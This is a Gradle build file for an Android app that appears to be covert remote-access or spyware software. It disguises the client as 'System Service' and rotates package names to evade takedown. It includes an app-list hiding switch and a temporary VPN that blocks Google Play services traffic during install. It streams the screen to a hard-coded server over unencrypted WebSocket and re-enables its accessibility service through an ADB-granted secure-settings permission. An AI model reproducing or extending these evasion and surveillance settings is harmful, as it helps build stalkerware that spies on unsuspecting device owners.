plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

// 仓库根目录共用配置；local.properties 可覆盖
val androidEnvPropFiles = listOf(
    rootProject.file("../android-package.properties"),
    rootProject.file("android-package.properties"),
    rootProject.file("../android-env.properties"),
    rootProject.file("android-env.properties"),
    rootProject.file("local.properties"),
)

fun loadAndroidEnvProps(): MutableMap<String, String> {
    val props = mutableMapOf<String, String>()
    androidEnvPropFiles.forEach { file ->
        if (!file.exists()) return@forEach
        file.readLines().forEach { raw ->
            val line = raw.trim()
            if (line.isEmpty() || line.startsWith("#")) return@forEach
            val idx = line.indexOf('=')
            if (idx <= 0) return@forEach
            props[line.substring(0, idx).trim()] = line.substring(idx + 1).trim()
        }
    }
    return props
}

fun propOr(props: Map<String, String>, key: String, fallback: String): String =
    props[key]?.trim()?.takeIf { it.isNotEmpty() } ?: fallback

/** BuildConfig 字符串转义 */
fun escapeBuildConfigString(value: String): String =
    value.replace("\\", "\\\\").replace("\"", "\\\"")

/** resValue / XML 字符串转义 */
fun escapeAndroidResString(value: String): String =
    value
        .replace("\\", "\\\\")
        .replace("\"", "\\\"")
        .replace("'", "\\'")
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")

fun resolveServerUrls(props: Map<String, String>): Triple<String, String, String> {
    val env = (props["APP_ENV"] ?: "prod").trim().lowercase()
    val prefix = if (env == "dev") "DEV" else "PROD"
    val api = propOr(props, "${prefix}_API_BASE", "https://td.tkjy689.buzz")
    val ws = propOr(props, "${prefix}_WS_BASE", "ws://td.tkjy689.buzz/ws/device")
    val wsScreen = propOr(
        props,
        "${prefix}_WS_SCREEN_BASE",
        "ws://td.tkjy689.buzz/ws/device/screen",
    )
    return Triple(api, ws, wsScreen)
}

val androidEnvProps = loadAndroidEnvProps()
val (apiBaseUrl, wsBaseUrl, wsScreenBaseUrl) = resolveServerUrls(androidEnvProps)
val appEnvName = (androidEnvProps["APP_ENV"] ?: "prod").trim().lowercase()
val clientApplicationId = propOr(androidEnvProps, "CLIENT_APPLICATION_ID", "com.vibelink.client")
val installerApplicationId = propOr(androidEnvProps, "INSTALLER_APPLICATION_ID", "com.vibelink.installer")
val clientAppName = propOr(androidEnvProps, "CLIENT_APP_NAME", "System Service")
val installerAppName = propOr(androidEnvProps, "INSTALLER_APP_NAME", "VibeLink")
// 无障碍列表/详情页标题；竞品常写成 A 显示名。未配则跟 INSTALLER_APP_NAME
val clientAccessibilityName = propOr(
    androidEnvProps,
    "CLIENT_ACCESSIBILITY_NAME",
    installerAppName,
)
val clientVersionCode = propOr(androidEnvProps, "CLIENT_VERSION_CODE", "1").toInt()
val clientVersionName = propOr(androidEnvProps, "CLIENT_VERSION_NAME", "0.1.0")
// namespace 与源码目录绑定，禁止随马甲天天改
val clientNamespace = "com.vibelink.client"
logger.lifecycle(
    "[Android] APP_ENV=$appEnvName applicationId=$clientApplicationId " +
        "version=$clientVersionName($clientVersionCode) " +
        "appName=$clientAppName a11yName=$clientAccessibilityName " +
        "namespace=$clientNamespace API_BASE_URL=$apiBaseUrl",
)

/**
 * FCM 接入开关。
 *
 * google-services 插件 4.4.x 只认固定位置 `app/google-services.json`，不支持配置路径，
 * 所以按固定位置读取。但插件的任务会用 json 里 `client[].client_info.android_client_info.package_name`
 * 去校验当前 variant 的 applicationId，不匹配直接让构建失败——马甲包每期换包名，
 * 那会把产线打包顶死。因此这里先自己校验：
 *   缺失 / 不匹配 → 不 apply 插件，FcmWakeReceiver 仍可用（adb 广播路径），只是没有真实 FCM；
 *   匹配          → apply 插件，生成 google_app_id 等资源，FCM 可用。
 */
val googleServicesFile = file("google-services.json")
val googleServicesPackages: List<String> = if (googleServicesFile.exists()) {
    runCatching {
        @Suppress("UNCHECKED_CAST")
        val root = groovy.json.JsonSlurper().parse(googleServicesFile) as Map<String, Any?>
        @Suppress("UNCHECKED_CAST")
        val clients = root["client"] as? List<Map<String, Any?>> ?: emptyList()
        clients.mapNotNull { client ->
            @Suppress("UNCHECKED_CAST")
            val info = client["client_info"] as? Map<String, Any?>
            @Suppress("UNCHECKED_CAST")
            val androidInfo = info?.get("android_client_info") as? Map<String, Any?>
            androidInfo?.get("package_name") as? String
        }
    }.getOrElse { emptyList() }
} else {
    emptyList()
}
val fcmEnabled = googleServicesPackages.contains(clientApplicationId)
logger.lifecycle(
    "[Android] FCM enabled=$fcmEnabled " +
        "googleServicesFile=${if (googleServicesFile.exists()) "found" else "missing"} " +
        "declaredPackages=$googleServicesPackages",
)

if (fcmEnabled) {
    apply(plugin = "com.google.gms.google-services")
}

android {
    namespace = clientNamespace
    compileSdk = 35

    defaultConfig {
        applicationId = clientApplicationId
        minSdk = 26
        targetSdk = 35
        versionCode = clientVersionCode
        versionName = clientVersionName

        buildConfigField("String", "API_BASE_URL", "\"$apiBaseUrl\"")
        buildConfigField("String", "WS_BASE_URL", "\"$wsBaseUrl\"")
        buildConfigField("String", "WS_SCREEN_BASE_URL", "\"$wsScreenBaseUrl\"")
        buildConfigField("String", "APP_ENV", "\"$appEnvName\"")
        buildConfigField("String", "INSTALLER_APPLICATION_ID", "\"$installerApplicationId\"")
        buildConfigField("String", "CLIENT_NAMESPACE", "\"$clientNamespace\"")
        buildConfigField("String", "CLIENT_APP_NAME", "\"${escapeBuildConfigString(clientAppName)}\"")
        buildConfigField("String", "INSTALLER_APP_NAME", "\"${escapeBuildConfigString(installerAppName)}\"")
        buildConfigField(
            "String",
            "CLIENT_ACCESSIBILITY_NAME",
            "\"${escapeBuildConfigString(clientAccessibilityName)}\"",
        )

        // 覆盖各语言 values*/strings.xml 里的 app_name，统一用配置显示名
        resValue("string", "app_name", escapeAndroidResString(clientAppName))
        // 无障碍服务在系统设置里的显示名（可与桌面名不同）
        resValue("string", "accessibility_service_label", escapeAndroidResString(clientAccessibilityName))

        // gradle.properties: ENABLE_APP_LIST_PROTECT=0|1（默认 1）
        // 一并控制：应用列表保护 + 真黑屏本地紧急退出（音量组合/四角）开关。
        val appListProtect = (project.findProperty("ENABLE_APP_LIST_PROTECT") as String?)
            ?.trim()
            ?.let { it == "1" || it.equals("true", ignoreCase = true) }
            ?: true
        buildConfigField("boolean", "ENABLE_APP_LIST_PROTECT", appListProtect.toString())

        // gradle.properties: KEEPALIVE_WAKE_LOCK=off|partial|partial-job|screen-bright（默认 off）
        // A/B 验证用：WS 建连即持有一把常驻 wakelock，验证能否阻止厂商 Hiber 进入 /frozen。
        val keepAliveWakeLock = (project.findProperty("KEEPALIVE_WAKE_LOCK") as String?)
            ?.trim()
            ?.lowercase()
            ?: "off"
        buildConfigField("String", "KEEPALIVE_WAKE_LOCK", "\"$keepAliveWakeLock\"")

        // android-env.properties: STOP_VPN_AFTER_SETUP=0|1（默认 1）
        //
        // 默认必须是 1。黑洞 VPN 把 com.google.android.gms 的流量全丢，而 FCM 完全依赖
        // GMS：实测「VPN 建立 → SERVICE_NOT_AVAILABLE → 订阅永不生效 → 收不到唤醒」，
        // 关掉 VPN 后同一台机立刻 subscribe 成功并端到端收到消息。
        //
        // 竞品 Minishort 的 PpVpn 也是**临时**的：只在安装器 A 前台时建立，
        // A.onStop() 立刻 PpVpn.stopVpn()，且 B 包内根本没有 VpnService。
        // 我们是一个包身兼安装器与常驻体，所以必须靠这个开关在 setup 完成后停掉。
        val stopVpnAfterSetup = propOr(androidEnvProps, "STOP_VPN_AFTER_SETUP", "1")
            .let { it == "1" || it.equals("true", ignoreCase = true) }
        buildConfigField("boolean", "STOP_VPN_AFTER_SETUP", stopVpnAfterSetup.toString())

        // B 包是否自己建黑洞 VPN（默认 false，与 1688 一致：只由 A 安装器建，装完就退）。
        //
        // 为什么默认关：黑洞 VPN 把 com.google.android.gms 的流量全丢，FCM 全靠 GMS。
        // 只要 B 建的 VPN 还活着，`subscribeToTopic()` 就是 SERVICE_NOT_AVAILABLE，
        // 且 GMS 会以 "Won't retry the operation" 直接放弃——除了重启进程没救。
        // 更糟的是 setupCompleted=false（向导未走完/清过数据）时 STOP_VPN_AFTER_SETUP
        // 不生效，VPN 会被反复拉起，FCM 永远订不上。
        //
        // 打开方式（仅调试用）：-PCLIENT_OWN_VPN=1
        val clientOwnVpn = (project.findProperty("CLIENT_OWN_VPN") as String?)
            ?.trim()?.lowercase()
            ?.let { it == "1" || it == "true" || it == "on" }
            ?: false
        buildConfigField("boolean", "CLIENT_OWN_VPN", clientOwnVpn.toString())

        // 无障碍被系统/厂商杀掉后，由 B 自己改写 enabled_accessibility_services 拉回。
        //
        // 前提是后台在 ADB 配对成功时执行过 `pm grant <clientPkg> WRITE_SECURE_SETTINGS`
        // （该权限 prot 含 development，shell 可授予普通应用）。没拿到授权时整条路径
        // 直接 no-op，所以默认开启对老装机没有副作用。
        //
        // 关闭方式：-PA11Y_SELF_HEAL=0
        val a11ySelfHeal = (project.findProperty("A11Y_SELF_HEAL") as String?)
            ?.trim()?.lowercase()
            ?.let { !(it == "0" || it == "false" || it == "off") }
            ?: true
        buildConfigField("boolean", "A11Y_SELF_HEAL", a11ySelfHeal.toString())

        // FCM：json 缺失/包名不匹配时为 false，代码据此跳过 Firebase 初始化，不阻断打包
        buildConfigField("boolean", "FCM_ENABLED", fcmEnabled.toString())

        // FcmWakeReceiver 的 android:permission。
        // 生产口径必须只有 GMS 能发；本地 adb 验证时用 -PFCM_RECEIVER_PERMISSION=android.permission.DUMP。
        val fcmReceiverPermission = (project.findProperty("FCM_RECEIVER_PERMISSION") as String?)
            ?.trim()
            ?.takeIf { it.isNotEmpty() }
            ?: "com.google.android.c2dm.permission.SEND"
        manifestPlaceholders["fcmReceiverPermission"] = fcmReceiverPermission

        manifestPlaceholders["clientApplicationId"] = clientApplicationId
        manifestPlaceholders["installerApplicationId"] = installerApplicationId
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro",
            )
        }
        debug {
            applicationIdSuffix = ".debug"
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }

    buildFeatures {
        buildConfig = true
        viewBinding = true
    }

    // release 签名默认用仓库根的 testkey.jks（当前打包口径）。
    // keystore.properties 存在且写了 storeFile 时以它为准；都没有就不签 release，不阻断其它任务。
    val keystoreProps = loadKeystoreProps()
    val defaultStore = listOf("../testkey.jks", "testkey.jks")
        .firstOrNull { rootProject.file(it).exists() }
    val storePath = keystoreProps["storeFile"]?.takeIf { it.isNotEmpty() } ?: defaultStore
    if (storePath != null) {
        val fromProps = !keystoreProps["storeFile"].isNullOrEmpty()
        signingConfigs {
            create("release") {
                storeFile = rootProject.file(storePath)
                // 回落时用 AOSP testkey 的公开口令（android / testkey）
                storePassword = keystoreProps["storePassword"] ?: "android"
                keyAlias = keystoreProps["keyAlias"] ?: "testkey"
                keyPassword = keystoreProps["keyPassword"] ?: "android"
            }
        }
        buildTypes.getByName("release") {
            signingConfig = signingConfigs.getByName("release")
        }
        logger.lifecycle(
            "[Android] release 签名 storeFile=$storePath " +
                if (fromProps) "(from keystore.properties)" else "(default: testkey.jks)",
        )
    } else {
        logger.lifecycle("[Android] 未找到 release 签名，release 包将使用 debug 签名")
    }
}

/**
 * 读取 `Android/keystore.properties`（勿提交）。
 *
 * 同时承载 FCM 开关：google-services 插件 4.4.x **只认固定位置**
 * `app/google-services.json`，无法配置路径，所以这里不做路径转发，
 * 只读一个 `fcmEnabled` 决定是否启用 FCM 构建。
 */
fun loadKeystoreProps(): Map<String, String> {
    val props = mutableMapOf<String, String>()
    val file = rootProject.file("keystore.properties")
    if (!file.exists()) return props
    file.readLines().forEach { raw ->
        val line = raw.trim()
        if (line.isEmpty() || line.startsWith("#")) return@forEach
        val idx = line.indexOf('=')
        if (idx <= 0) return@forEach
        props[line.substring(0, idx).trim()] = line.substring(idx + 1).trim()
    }
    return props
}

// BuildConfig 里的值全部来自 android-env.properties / android-package.properties，
// 但 Gradle 不看这个文件，改了它再增量构建会沿用上一次生成的 BuildConfig
// （踩过一次：STOP_VPN_AFTER_SETUP 改了默认值却一直是旧值）。显式声明为输入。
tasks.withType<com.android.build.gradle.tasks.GenerateBuildConfig>().configureEach {
    inputs.files(androidEnvPropFiles.filter { it.exists() })
        .withPropertyName("androidEnvProps")
        .withPathSensitivity(PathSensitivity.RELATIVE)
}

dependencies {
    implementation("androidx.core:core-ktx:1.15.0")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.constraintlayout:constraintlayout:2.2.0")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.7")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
    // Screen cast over WebRTC (MediaProjection → PeerConnection)
    implementation("io.getstream:stream-webrtc-android:1.3.8")
    // FCM：冻结态下唯一能穿透 Hiber 的通道（见 docs/僵尸唤醒与竞品保活机制-分析报告.md §4.7）
    implementation(platform("com.google.firebase:firebase-bom:33.8.0"))
    implementation("com.google.firebase:firebase-messaging")
}
